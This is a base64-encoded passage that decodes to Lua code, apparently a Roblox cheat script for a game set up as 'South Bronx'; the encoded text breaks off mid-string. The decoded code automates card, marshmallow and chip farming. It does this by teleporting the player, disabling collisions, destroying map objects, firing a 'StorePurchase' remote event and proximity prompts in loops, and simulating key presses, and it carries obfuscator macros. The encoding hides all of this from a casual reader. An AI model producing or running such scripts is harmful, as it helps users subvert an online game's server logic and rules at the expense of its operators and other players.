ICAgICAgICAgdGFzay5zcGF3bihMUEhfSklUX01BWChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSB0YXNrLndhaXQoLjEpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5Tb3V0aF9Ccm9ueC5GYXJtaW5nVXRpbGl0aWVzLkNhcmRGYXJtIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikuU2l0ID0gZmFsc2UgOyBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikuSnVtcCA9IHRydWUKCiAgICAgICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBXb3Jrc3BhY2UuTWFwLkxvY2F0aW9uc1siQ29tbXVuaXR5IEJhbmsiXTpHZXREZXNjZW5kYW50cygpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFZhbHVlLkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSkKCiAgICAgICAgICAgIHRhc2suc3Bhd24oTFBIX0pJVF9NQVgoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgdGFzay53YWl0KC4xKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuU291dGhfQnJvbnguRmFybWluZ1V0aWxpdGllcy5NYXJzaG1hbGxvd0Zhcm0gdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKS5TaXQgPSBmYWxzZSA7IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKS5KdW1wID0gdHJ1ZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkpCiAgICAgICAgCiAgICAgICAgICAgIHBsYXllckhhc0NhcmQgPSBmYWxzZQoKICAgICAgICAgICAgdGFzay5zcGF3bihMUEhfSklUX01BWChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSB0YXNrLndhaXQoLjEpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5Tb3V0aF9Ccm9ueC5GYXJtaW5nVXRpbGl0aWVzLkNhcmRGYXJtIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBXb3Jrc3BhY2UuTWFwLkRlY29yOkZpbmRGaXJzdENoaWxkKCJyYWlsIHRoaW5nIik6RGVzdHJveSgpCiAgICAgICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgV29ya3NwYWNlLk1hcC5EZWNvcjpGaW5kRmlyc3RDaGlsZCgicmFpbCB0aGluZyIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpKQoKICAgICAgICAgICAgbG9jYWwgTWFyc2htYWxsb3dGYXJtX1RocmVhZAoKICAgICAgICAgICAgU3RhcnRfTWFyc2htYWxsb3dGYXJtID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgTWFyc2htYWxsb3dGYXJtX1RocmVhZCA9IHRhc2suc3Bhd24oTFBIX0pJVF9NQVgoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIHdoaWxlIHdhaXQoKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLlNvdXRoX0Jyb254LkZhcm1pbmdVdGlsaXRpZXMuTWFyc2htYWxsb3dGYXJtIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIE93bnNfQmlrZSA9IENvbmZpZy5Tb3V0aF9Ccm9ueC5Pd25lZEJpa2UgPT0gIk5vIgogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgTWFyc2htZWxsb3dfSW5jcmVtZW50ID0gQ29uZmlnLlNvdXRoX0Jyb254LkZhcm1pbmdVdGlsaXRpZXMuTWFyc2htYWxsb3dJbmNyZW1lbnQKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEl0ZW1zID0geyJHZWxhdGluIiwgIlN1Z2FyIEJsb2NrIEJhZyIsICJXYXRlciJ9CgogICAgICAgICAgICAgICAgICAgICAgICBUZWxlcG9ydChDRnJhbWUubmV3KDUxMCwgNCwgNjAyKSwgT3duc19CaWtlKQoKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8gPSAxLCBNYXJzaG1lbGxvd19JbmNyZW1lbnQgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gSXRlbXMgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIlJlbW90ZUV2ZW50cyIpOldhaXRGb3JDaGlsZCgiU3RvcmVQdXJjaGFzZSIpOkZpcmVTZXJ2ZXIoVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgzKQoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgSG91c2UgPSBHZXRIb3VzZSgpOwoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IEhvdXNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSBIb3VzZSA9IEdldEhvdXNlKCkgdW50aWwgSG91c2Ugfj0gbmlsCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFBvdCA9IEhvdXNlLkludGVyaW9yWyJDb29raW5nIFBvdCJdCgogICAgICAgICAgICAgICAgICAgICAgICBUZWxlcG9ydChQb3QuQ0ZyYW1lLCBPd25zX0Jpa2UpCgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKCiAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpNb3ZlVG8oUG90LlBvc2l0aW9uKQoKICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLk1vdmVUb0ZpbmlzaGVkOldhaXQoKQoKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8gPSAxLCBNYXJzaG1lbGxvd19JbmNyZW1lbnQgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIldhdGVyIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIldhdGVyIikpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KFBvdC5BdHRhY2htZW50LlByb3hpbWl0eVByb21wdCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMi41KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBQb3QuVGltZXIuVGV4dExhYmVsLlRleHQgPT0gIjAiCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiU3VnYXIgQmxvY2sgQmFnIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlN1Z2FyIEJsb2NrIEJhZyIpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChQb3QuQXR0YWNobWVudC5Qcm94aW1pdHlQcm9tcHQpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDIuNSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6VW5lcXVpcFRvb2xzKCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJHZWxhdGluIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkdlbGF0aW4iKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmVwcm94aW1pdHlwcm9tcHQoUG90LkF0dGFjaG1lbnQuUHJveGltaXR5UHJvbXB0KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgzKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBQb3QuVGltZXIuVGV4dExhYmVsLlRleHQgPT0gIjAiCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiRW1wdHkgQmFnIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkVtcHR5IEJhZyIpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChQb3QuQXR0YWNobWVudC5Qcm94aW1pdHlQcm9tcHQpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOlVuZXF1aXBUb29scygpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnQoQ0ZyYW1lLm5ldyg1MTAsIDQsIDYwMiksIE93bnNfQmlrZSkKCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBXb3Jrc3BhY2UuTlBDczpGaW5kRmlyc3RDaGlsZCgnTGFtb250IEJlbGwnKQoKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCgogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6TW92ZVRvKFZlY3RvcjMubmV3KDUxMSwgNCwgNTk4KSkKCiAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5Nb3ZlVG9GaW5pc2hlZDpXYWl0KCkKCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgVmFsdWU6SXNBKCJUb29sIikgYW5kIFZhbHVlLk5hbWU6ZmluZCgiTWFyc2htYWxsb3ciKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChWYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KFdvcmtzcGFjZS5OUENzWyJMYW1vbnQgQmVsbCJdLlVwcGVyVG9yc28uUHJveGltaXR5UHJvbXB0KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgzKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKSkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBTdG9wX01hcnNobWFsbG93RmFybSA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGlmIG5vdCBNYXJzaG1hbGxvd0Zhcm1fVGhyZWFkIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgaWYgY29yb3V0aW5lLnN0YXR1cyhNYXJzaG1hbGxvd0Zhcm1fVGhyZWFkKSA9PSAic3VzcGVuZGVkIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgdGFzay5jYW5jZWwoTWFyc2htYWxsb3dGYXJtX1RocmVhZCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBsb2NhbCBDaGlwRmFybV9UaHJlYWQKCiAgICAgICAgICAgIFN0YXJ0X0NoaXBGYXJtID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgQ2hpcEZhcm1fVGhyZWFkID0gdGFzay5zcGF3bihMUEhfSklUX01BWChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgdGFzay53YWl0KDEpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuU291dGhfQnJvbnguRmFybWluZ1V0aWxpdGllcy5DaGlwRmFybSB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgT3duc19CaWtlID0gQ29uZmlnLlNvdXRoX0Jyb254Lk93bmVkQmlrZSA9PSAiTm8iCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkZsb3VyIikgb3Igbm90IExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQb3RhdG8iKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZWxlcG9ydF9TdGF0dXMgPSBUZWxlcG9ydChDRnJhbWUubmV3KC03NzMsIDQsIC0xNTcpLCBPd25zX0Jpa2UpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiRmxvdXIiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IHRhc2sud2FpdCgyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiUmVtb3RlRXZlbnRzIik6V2FpdEZvckNoaWxkKCJTdG9yZVB1cmNoYXNlIik6RmlyZVNlcnZlcigiRmxvdXIiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsIExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJGbG91ciIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUG90YXRvIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoMikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIlJlbW90ZUV2ZW50cyIpOldhaXRGb3JDaGlsZCgiU3RvcmVQdXJjaGFzZSIpOkZpcmVTZXJ2ZXIoIlBvdGF0byIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdW50aWwgTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlBvdGF0byIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUG90YXRvIikgYW5kIExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJGbG91ciIpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgzKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBUZWxlcG9ydF9TdGF0dXMgPSBUZWxlcG9ydChDRnJhbWUubmV3KC00NzksIDQsIC00MzcpLCBPd25zX0Jpa2UpCgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgdGFzay53YWl0KCkgdW50aWwgVGVsZXBvcnRfU3RhdHVzID09ICJTdWNjZXNzIgoKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOk1vdmVUbyhWZWN0b3IzLm5ldygtNDc5LCA0LCAtNDM3KSkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLk1vdmVUb0ZpbmlzaGVkOldhaXQoKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KFdvcmtzcGFjZS5NYXAuTG9jYXRpb25zWyJUaGUgTGFib3JhdG9yeSJdLlByb21wdHMuQ2xpcGJvYXJkLlByb3hpbWl0eVByb21wdCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDIpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIENvb2tpbmdCb2FyZCA9IEdldEN1dHRpbmdCb2FyZCgpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpNb3ZlVG8oQ29va2luZ0JvYXJkLlBhcnQuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5Nb3ZlVG9GaW5pc2hlZDpXYWl0KCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUG90YXRvIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUG90YXRvIikpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMikKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChDb29raW5nQm9hcmQ6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiUHJveGltaXR5UHJvbXB0IiwgdHJ1ZSkpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgzKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6TW92ZVRvKFZlY3RvcjMubmV3KC00NjMsIDQsIC00NzMpKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuTW92ZVRvRmluaXNoZWQ6V2FpdCgpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmVwcm94aW1pdHlwcm9tcHQoV29ya3NwYWNlLk1hcC5Mb2NhdGlvbnNbIlRoZSBMYWJvcmF0b3J5Il0uUHJvbXB0c1siUGxhc3RpYyBCYWciXS5BdHRhY2htZW50LlByb3hpbWl0eVByb21wdCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEuNSkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOk1vdmVUbyhWZWN0b3IzLm5ldygtNDY2LCA0LCAtNDc0KSkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLk1vdmVUb0ZpbmlzaGVkOldhaXQoKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6TW92ZVRvKFZlY3RvcjMubmV3KC00NjYsIDQsIC01MjIpKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuTW92ZVRvRmluaXNoZWQ6V2FpdCgpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEJvd2wgPSBHZXRCb3dsKCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOk1vdmVUbyhCb3dsLkNhbVBhcnQuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5Nb3ZlVG9GaW5pc2hlZDpXYWl0KCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiRmxvdXIiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJGbG91ciIpKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmVwcm94aW1pdHlwcm9tcHQoQm93bC5Qcm94aW1pdHlQcm9tcHQpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCg1KQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6TW92ZVRvKFZlY3RvcjMubmV3KC00NjYsIDQsIC01MTgpKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuTW92ZVRvRmluaXNoZWQ6V2FpdCgpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpNb3ZlVG8oVmVjdG9yMy5uZXcoLTQ2NywgNCwgLTQ3MCkpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5Nb3ZlVG9GaW5pc2hlZDpXYWl0KCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgUG90ID0gR2V0UG90KCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOk1vdmVUbyhQb3QuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5Nb3ZlVG9GaW5pc2hlZDpXYWl0KCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChQb3QuUHJveGltaXR5UHJvbXB0KQoKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDUpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoMSkgdW50aWwgUG90LlRpbWVyLlRleHRMYWJlbC5UZXh0ID09ICIwIgoKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChQb3QuUHJveGltaXR5UHJvbXB0KQoKICAgICAgICAgICAgICAgICAgICAgICAgUHJlc3NLZXkoRW51bS5LZXlDb2RlLlcsIC4yNSkgdGFzay53YWl0KC4yNSkKICAgICAgICAgICAgICAgICAgICAgICAgUHJlc3NLZXkoRW51bS5LZXlDb2RlLlMsIC4yNSkgdGFzay53YWl0KC4yNSkKICAgICAgICAgICAgICAgICAgICAgICAgUHJlc3NLZXkoRW51bS5LZXlDb2RlLkEsIC4yNSkgdGFzay53YWl0KC4yNSkKICAgICAgICAgICAgICAgICAgICAgICAgUHJlc3NLZXkoRW51bS5LZXlDb2RlLkQsIC4yNSkgdGFzay53YWl0KC4yNSkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IHRhc2sud2FpdCgpIHVudGlsIExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQb3RhdG8gQ2hpcHMiKQoKICAgICAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnRfU3RhdHVzID0gVGVsZXBvcnQoV29ya3NwYWNlLk5QQ3M6RmluZEZpcnN0Q2hpbGQoIlBvb3IgR3V5IikuSGVhZC5DRnJhbWUpCgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgdGFzay53YWl0KCkgdW50aWwgVGVsZ